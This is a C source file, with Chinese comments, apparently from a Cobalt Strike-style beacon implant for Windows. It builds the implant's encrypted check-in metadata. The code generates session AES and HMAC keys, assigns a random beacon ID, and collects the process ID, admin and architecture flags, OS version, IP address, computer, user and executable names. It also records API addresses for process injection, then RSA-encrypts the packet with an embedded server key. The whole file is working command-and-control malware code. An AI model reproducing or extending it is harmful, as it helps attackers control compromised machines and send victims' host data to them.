#include <Winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include "MetaData.h"
#include "Util.h"
#include "Config.h"
#include "Api.h"
#include "Process.h"

extern unsigned char g_aeskey[16];
extern unsigned char g_hmackey[16];
extern int g_client_id;

MakeMetaInfoResult MakeMetaInfo() {
    MakeMetaInfoResult failed_result = { NULL, 0 };
    datap* parser = BeaconDataAlloc(sizeof(OSVERSIONINFOA) + MAX_INFO + MAX_COMPUTER_NAME + MAX_USER_NAME + MAX_FILE_NAME);

    // 生成随机数
    unsigned char key[16];
    if (!generate_random_aes_key(key, sizeof(key))) {
        fprintf(stderr, "Failed to generate AES key\n");
        return failed_result;
    }

    unsigned char hash[32]; 
    BOOL bSHA256 = sha256_hash(key, 16, hash);
    if (!bSHA256) {
        fprintf(stderr, "sha256_hash failed\n");
        return failed_result;
    }

    // 前 16 字节为 AES 密钥
    memcpy(g_aeskey, hash, 16);
    // 后 16 字节为 HMAC 密钥 
    memcpy(g_hmackey, hash + 16, 16);

    // 获取当前系统的 ANSI 代码页
    short acp = GetACP();

    // 获取 OEM 代码页的字节序列
    short oemcp = GetOEMCP();

    // 随机生成一个 6 位偶数为 BeaconId
    g_client_id = generate_random_data(100000, 999998);

    // PID
    uint32_t pid = GetCurrentProcessId();

    // 此函数获取 Flag，根据 Flag 可以判断是否是管理员权限的 beacon，是否是 64 位架构，beacon 是否 64 位
    char flags = 0;

    if (is_x64_process(GetCurrentProcess()))
    {
        flags = METADATA_FLAG_X64_AGENT | METADATA_FLAG_X64_SYSTEM;
    }

    if (BeaconIsAdmin()) {
        flags |= METADATA_FLAG_ADMIN;
    }

    // os version
    OSVERSIONINFOA* osVersionInfo = BeaconDataPtr(parser, sizeof(OSVERSIONINFOA));
    osVersionInfo->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(osVersionInfo);

    // IP
    ULONG ip = GetIP();

    // info
    unsigned char* info = BeaconDataPtr(parser, MAX_INFO);
    unsigned char* computer_name = BeaconDataPtr(parser, MAX_COMPUTER_NAME);
    unsigned char* user_name = BeaconDataPtr(parser, MAX_USER_NAME);
    unsigned char* file_name = BeaconDataPtr(parser, MAX_FILE_NAME);

    int pcbBuffer = MAX_USER_NAME;
    GetUserNameA(user_name, &pcbBuffer);

    pcbBuffer = MAX_COMPUTER_NAME;
    GetComputerNameA(computer_name, &pcbBuffer);

    const unsigned char* file = "<unknown name>";
    if (GetModuleFileNameA(NULL, file_name, MAX_FILE_NAME))
    {
        unsigned char* found = strrchr(file_name, '\\');
        if (found != NULL && found != (unsigned char*)-1)
        {
            file = found + 1;
        }
    }
    snprintf(info, MAX_INFO, "%s\t%s\t%s", computer_name, user_name, file);

    // 开始拼接 metadata
    formatp format;
    BeaconFormatAlloc(&format, MAX_GET);
    // magic number
    BeaconFormatInt(&format, METADATA_ID);
    // Metadata length placeholder
    BeaconFormatInt(&format, 0);
    // AES Key
    BeaconFormatAppend(&format, key, sizeof(key));
    // acp
    BeaconFormatAppend(&format, &acp, 2);
    // oemcp
    BeaconFormatAppend(&format, &oemcp, 2);
    // Beacon id
    BeaconFormatInt(&format, g_client_id);
    // pid
    BeaconFormatInt(&format, pid);
    // g_port ssh session
    BeaconFormatShort(&format, 0);
    // flag
    BeaconFormatChar(&format, flags);
    // os version
    BeaconFormatChar(&format, osVersionInfo->dwMajorVersion);
    BeaconFormatChar(&format, osVersionInfo->dwMinorVersion);
    BeaconFormatShort(&format, osVersionInfo->dwBuildNumber);
    // about smart inject 
    BeaconFormatInt(&format, is_x64() ? (long long)GetProcAddress >> 32 : 0);
    BeaconFormatInt(&format, GetModuleHandleA);
    BeaconFormatInt(&format, GetProcAddress);
    // ip
    BeaconFormatInt(&format, ip);
    // Information: computer name, user name, executable name
    BeaconFormatAppend(&format, info, min(strlen(info), 58));

    ULONG metadata_size = ntohl(format.length - (2 * sizeof(int)));

    memcpy(BeaconFormatOriginal(&format) + 4, &metadata_size, 4);
    size_t packet_info_length = BeaconFormatLength(&format);
    unsigned char* packet_info = (unsigned char*)malloc(packet_info_length);
    if (!packet_info) {
        fprintf(stderr, "Memory allocation failed");
        return failed_result;
    }
    memcpy(packet_info, BeaconFormatOriginal(&format), packet_info_length);

    MakeMetaInfoResult mmir;
    mmir.MakeMeta = packet_info;
    mmir.MakeMetaLen = packet_info_length;

    BeaconDataFree(parser);
    BeaconFormatFree(&format);

    return mmir;
}

BOOL PemToCNG(PCSTR pszPem, BCRYPT_KEY_HANDLE* phKey)
{
    PBYTE pbDer = NULL;
    DWORD cbDer = 0;
    PCERT_PUBLIC_KEY_INFO pPubKeyInfo = NULL;
    DWORD cbPubKeyInfo = 0;
    BOOL result = FALSE;

    // 转 Base64 -> DER
    if (!CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, NULL, &cbDer, NULL, NULL)) {
        fprintf(stderr, "CryptStringToBinaryA(size) failed with error:%lu\n", GetLastError());
        goto Cleanup;
    }

    pbDer = (PBYTE)malloc(cbDer);
    if (!pbDer) {
        fprintf(stderr, "Memory allocation failed\n");
        goto Cleanup;
    }

    if (!CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, pbDer, &cbDer, NULL, NULL)) {
        fprintf(stderr, "CryptStringToBinaryA(data) failed with error:%lu\n", GetLastError());
        goto Cleanup;
    }

    if (!CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        X509_PUBLIC_KEY_INFO,
        pbDer, cbDer,
        CRYPT_DECODE_ALLOC_FLAG,
        NULL,
        &pPubKeyInfo,
        &cbPubKeyInfo)) {
        fprintf(stderr, "CryptDecodeObjectEx failed with error:%lu\n", GetLastError());
        goto Cleanup;
    }

    if (!CryptImportPublicKeyInfoEx2(X509_ASN_ENCODING, pPubKeyInfo, 0, NULL, phKey)) {
        fprintf(stderr, "CryptImportPublicKeyInfoEx2 failed with Error:%lu\n", GetLastError());
        goto Cleanup;
    }

    result = TRUE;

Cleanup:
    if (pbDer) free(pbDer);
    if (pPubKeyInfo) LocalFree(pPubKeyInfo);

    return result;
}

// 使用 CNG 加密元数据
EncryptMetadataResult encryptMetadata()
{
    EncryptMetadataResult result = { 0 };
    BCRYPT_KEY_HANDLE hKey = NULL;
    uint8_t* pSrcData = NULL;
    unsigned char* pEncrypted = NULL;

    // 获取并导入 PEM 公钥
    if (!PemToCNG(g_public_key_str, &hKey) || !hKey) {
        fprintf(stderr, "Importing PEM public key failed\n");
        goto cleanup;
    }

    // 获取原始元数据信息
    MakeMetaInfoResult meta = MakeMetaInfo();
    pSrcData = meta.MakeMeta;
    ULONG cbSrcData = (ULONG)meta.MakeMetaLen;

    if (!pSrcData || cbSrcData == 0) {
        fprintf(stderr, "MakeMetaInfo failed\n");
        goto cleanup;
    }

    DWORD cbEncrypted = 0;
    NTSTATUS status = BCryptEncrypt(
        hKey,
        pSrcData, cbSrcData,
        NULL,
        NULL, 0,
        NULL, 0,
        &cbEncrypted,
        BCRYPT_PAD_PKCS1);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Failed to estimate encryption length:0x%08X\n", status);
        goto cleanup;
    }

    // 分配加密缓冲区
    pEncrypted = (unsigned char*)malloc(cbEncrypted);
    if (!pEncrypted) {
        fprintf(stderr, "Memory allocation failed\n");
        goto cleanup;
    }

    // 执行加密
    status = BCryptEncrypt(
        hKey,
        pSrcData, cbSrcData,
        NULL,
        NULL, 0,
        pEncrypted, cbEncrypted,
        &cbEncrypted,
        BCRYPT_PAD_PKCS1);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptEncrypt failed with error:0x%08X\n", status);
        goto cleanup;
    }

    result.EncryptMetadata = pEncrypted;
    result.EncryptMetadataLen = cbEncrypted;
    pEncrypted = NULL; 

cleanup:
    if (pSrcData) free(pSrcData);
    if (hKey) BCryptDestroyKey(hKey);
    if (pEncrypted) free(pEncrypted); 

    return result; 
}

ULONG GetIP() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed with error:%lu\n", GetLastError());
        return 0;
    }
    SOCKET sock = WSASocketA(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
    {
        return 0;
    }

    DWORD bytesReturned;
    int numInterfaces = 0;
    INTERFACE_INFO interfaceInfo[20];
    if (!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo), &bytesReturned, NULL, NULL))
    {
        numInterfaces = bytesReturned / sizeof(INTERFACE_INFO);
    }

    for (int i = 0; i < numInterfaces; i++)
    {
        if (!(interfaceInfo[i].iiFlags & IFF_LOOPBACK) && interfaceInfo[i].iiFlags & IFF_UP)
        {
            closesocket(sock);
            return interfaceInfo[i].iiAddress.AddressIn.sin_addr.s_addr;
        }
    }

    closesocket(sock);
    return 0;
}